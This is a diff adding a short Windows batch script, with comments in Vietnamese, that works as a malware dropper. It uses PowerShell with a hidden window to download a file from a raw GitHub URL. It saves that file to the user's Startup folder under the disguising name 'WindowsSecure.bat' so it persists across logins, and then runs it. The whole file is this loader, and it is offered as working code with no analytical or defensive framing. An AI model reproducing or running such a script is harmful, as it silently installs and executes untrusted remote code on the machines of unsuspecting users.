@@ -1,0 +1,22 @@
+@echo off
+setlocal
+
+:: Đặt đường dẫn lưu file và URL tải xuống
+set "download_url=https://raw.githubusercontent.com/hihipro1/Hihiprocon1/main/s6"
+set "file_path=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecure.bat"
+
+:: Tạo thư mục nếu nó chưa tồn tại
+if not exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" (
+    mkdir "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
+)
+
+:: Tải xuống file sử dụng PowerShell, chạy ẩn
+C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -Command "Invoke-WebRequest -URI '%download_url%' -OutFile '%file_path%'"
+
+:: Đợi 5 giây
+timeout /t 5 /nobreak > NUL
+
+:: Chạy file đã tải về
+start "" "%file_path%"
+
+endlocal
